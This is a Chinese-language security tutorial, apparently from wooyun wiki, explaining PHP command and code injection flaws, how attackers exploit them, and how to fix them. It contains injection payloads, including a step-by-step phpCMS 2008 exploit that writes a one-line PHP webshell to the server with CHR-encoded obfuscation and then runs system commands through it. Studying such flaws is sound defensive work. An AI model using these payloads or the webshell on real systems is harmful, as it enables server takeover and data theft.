原文 by wooyun wiki# 一、命令注入  
## 1、相关背景介绍  
当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。 这里还是主要以PHP为主介绍命令执行漏洞，Java等应用的细节待补充。  
  
## 2、成因  
脚本语言（如PHP）优点是简洁、方便，但也伴随着一些问题，如速度慢、无法接触系统底层，如果我们开发的应用（特别是企业级的一些应用）需要一些除去web的特殊功能时，就需要调用一些外部程序。  
在PHP中可以调用外部程序的主要有以下函数：  
system  
exec  
assert  
shell_exec  
passthru  
popen  
proc_popen  
escapeshellcmd  
pcntl_exec  
一些偏门函数就不说了，以上函数主要是在webshell里用的多，实际上在正常应用中差别不太大，用得最多的还是前三个。应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，又没有过滤用户的输入的情况下，就会造成命令执行漏洞。  
### 常见的一些成因：  
* 一些商业应用需要执行命令，商业应用的一些核心代码可能封装在二进制文件中，再web应用中通过system函数来调用之：  
`system("/bin/program --arg $arg");`  
* 系统的漏洞造成命令注入：  
不知各位看官是否还记得bash破壳漏洞，如果我们能够控制执行的bash的环境变量，就可以通过破壳漏洞来执行任意代码。  
  
* 调用一些常用组件  
很典型的就是Discuz中，可以选择使用ImageMagick这个常用的图片处理组件，对用户上传的图片进行处理（默认是GD库），而Discuz并没有很好控制用户的输入，造成命令执行。  
  
另外JAVA中的命令执行漏洞（struts2/Elasticsearch Groovy等）很常见，亟待补充。  
  
## 3、利用方法及危害  
常见可控位置情况有下面几种：  
`system("$arg");` //可控点直接是待执行的程序  
`system("/bin/prog $arg");` //可控点是传入程序的整个参数  
`system("/bin/prog -p $arg");` //可控点是传入程序的某个参数的值（无引号包裹）  
`system("/bin/prog --p=\"$arg\"");`//可控点是传入程序的某个参数的值（有双引号包裹）  
`system("/bin/prog --p='$arg'");` //可控点是传入程序的某个参数的值（有单引号包裹）  
```python  
sys=ctypes.cdll.LoadLibrary('/lib64/libc.so.6')     
sys.system(cmd)  
```  
### 第一种情况  
如果我们能直接控制$arg，那么就能执行执行任意命令了，没太多好说的。  
### 第二种情况  
我们能够控制的点是程序的整个参数，我们可以直接用&& || 或 | 等等，利用与、或、管道命令来执行其他命令（可以涉及到很多linux命令行技巧）。  
还有一个偏门情况，当$arg被 escapeshellcmd处理之后，我们不能越出这个外部程序的范围，我们可以看看这个程序自身是否有“执行外部命令”的参数或功能，比如linux下的sendmail 命令自带读写文件功能，我们可以用来写webshell。  
### 第三种情况  
我们控制的点是一个参数，我们也同样可以利用与、或、管道来执行其他命令，情境与二无异。  
### 第四种情况  
这种情况压力大一点，有双引号包裹。如果引号没有被转义，我们可以先闭合引号，成为第三种情况后按照第三种情况来利用，如果引号被转义（addslashes），我们也不必着急。linux shell 环境下双引号中间的变量也是可以被解析的，我们可以在双引号内利用反引号执行任意命令 &#96;id&#96;  
### 第五种情况  
这是最难受的一种情况了，因为单引号内只是一个字符串，我们要先闭合单引号才可以执行命令。如：system("/bin/prog –p='aaa' | id")  
  
危害自然不言而喻，执行命令可以读写文件、反弹shell、获得系统权限、内网渗透等。  
  
在漏洞检测中，除了有回显的命令注入（比如执行dir 命令或者cat 读取系统文件）；还可以使用盲打的方式，比如curl远程机器的某个目录（看access.log），或者通过dns解析的方式获取到漏洞机器发出的请求。  
  
## 4、修复方案  
1).能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在disable_functions中禁用之。  
2).对于可控点是程序参数的情况，使用escapeshellcmd 函数进行过滤。  
3).对于可控点是程序参数的值的情况，使用escapeshellarg 函数进行过滤。  
4).参数的值尽量使用单引号包裹，并在拼接前调用addslashes 进行转义。  
5).对于传入的变量做过滤，对于 \n $ & ; | ' " ( ) `（反单引号） 过滤或转义这些特殊字符  
  
  
# 二、代码注入  
## 1、漏洞成因  
当应用在调用一些能将字符串转化成代码的函数（如php中的eval）时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞。  
几种常用语言，都有将字符串转化成代码去执行的相关函数，如：  
- PHP：eval、assert  
- Javascript：eval  
- Vbscript: Execute、Eval  
- Python：exec  
- Java：Java中没有类似php中eval 函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞  
应用有时候会考虑灵活性、简洁性，在代码中调用eval之类的函数去处理。如phpcms中很常用的string2array 函数：  
`function string2array($data) {if($data == '') return array();@eval("\$array = $data;");return $array;}`  
  
PHP中能造成代码注入的主要函数： `eval` 、 `preg_replace + /e模式` 、`assert`  
用的一般就是前两者，CMS中很少用到assert的，至于一些偏门函数就更少了，用的情况仅限于留后门。 常见用法也有如下一些：  
```  
eval("\$ret = $data;");   
eval("\$ret = deal('$data');");   
eval("\$ret = deal("$data");");   
preg_replace('/<data>(.*)</data>/e', '$ret = "\\1";'); preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);?>  
```  
第一个就是刚才之前说phpcms 的，通常$data不会直接来自POST或GET变量（要不也太水了），但通过一些二次漏洞很可能能够造出代码执行（如SQL注入）。 第二个是将$data使用一个函数（deal）处理后再赋值给$ret。那么，传参的方式就很重要了。第二个用的是单引号传参，那么我们只能先闭合单引号，之后才能注入代码。如果应用全局做了addslashes或GPC=on的话，就不能够注入代码了。 第三个与第二个类似，但使用的是双引号传参。双引号在代码中有个很重要的特性，它能解析其中的函数，如我们传入`${phpinfo()}`，phpinfo将会被执行，而得到的返回值作为参数传入deal 函数。这个时候，我们就不用考虑闭合引号的事了。 第四个是preg_replace函数的误用，这种用法出现的情况是最多的，也是因为preg_replace第二个参数中，包裹正则结果\\\\1的是双引号，通过第三个中的方式，也能执行任意代码。  注意，第五个示例中包裹\\\\1 的可以是双引号或者单引号，都可以造成命令执行，提交 `h=[php]phpinfo()[/php]` 。    
php curly syntax： ${&#96;ls&#96;}  它将执行花括号内的代码，并将结果替换回去。  
  
## 2、phpCMS 2008 命令执行漏洞  
`index.php?userid=abc&menu=xxx`  
我们访问时填的 userid 在数据库是查找不到的，这样无法从数据库返回结果中 extract 出 $menu 变量的定义，在但最开始 程序会把 $_GET 获取到的参数都 extract 出来，这样的话 menu 变量的值可以由我们控制，  
由于 $menu 不为空，如果 `menu=phpinfo(); exit();`   内部执行 string2array 函数，  
`eval("\$arr=$data");` 时会 执行命令，即 `eval("\$arr=phpinfo();exit();");`  
进一步地，我们可以将一句话木马写成 webshell 文件放到网站服务器目录下  
一句话木马  `<?php eval($_GET['func']($_GET['cmd'])); ?>`  
`menu=file_put_contents('shell.php', ' <?php eval($_GET['func']($_GET['cmd'])); ?> ')`  
为了防止转义等导致命令执行不成功，可以用 ascii 码形式，即  
`index.php?userid=abc&menu=file_put_contents(CHR(115).CHR(104).CHR(101).CHR(108).CHR(108).CHR(42).CHR(112).CHR(104).CHR(112), ...);exit()`  
下次我们可以直接访问 `shell.php?func=system&cmd=dir`，执行php 代码 `system(dir)`。  
  
类似会造成变量覆盖的函数还有：import_request_variables(),  parse_str() 等  
  
  
## 3、修复方案：  
* 能使用json 保存数组、对象就使用json，不要将php对象保存成字符串，否则读取的时候需要使用eval。将字符串转化为对象的过程其实是将数据转化为代码的过程，这个过程很容易出现漏洞，像php的unserialize 导致代码执行、struts2的ognl 命令执行等漏洞都是这个过程导致的。  
* 对于必须使用eval 的情况，一定要保证用户不能轻易接触eval 的参数（或用正则严格判断输入的数据格式）。对于字符串，一定要使用单引号包裹可控代码，并再插入前进行addslashes，这样就无法闭合单引号，又因为不是双引号包裹，故不能执行 ${} 。  `evil('${phpinfo()}')`、`evil("phpinfo()")`  等都不会执行， `evil("${phpinfo()}")`、`evil(phpinfo())`、`evil(${@phpinfo()})` 都可以执行，因为双引号里面内容会被当作变量解析一次，函数前加 @ 表示执行函数时不报错。  `$data = addslashes($data);eval("\$data = deal('$data');");`    
* 放弃使用preg_replace 的e修饰符，而换用 preg_replace_callback 替代。如果非要使用preg_replace的e模式的话，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹（第4个示例）。  
* 确保register_globals = off, 若不能自定义php.ini，则应该在代码中控制；其次，熟悉可能造成变量覆盖的函数和方法，检查用户是否能控制变量的来源；最后，养成初始化变量的好习惯。  
* 能够往本地写入的函数都需要重点关注，如 file_put_contents(), fwrite(), fputs() 等。  
* 在自动化漏洞检测中可以 直接带入类似 `";print(md5(test));$a="` ，匹配返回页面是否有 md5 字符串。  
  
  
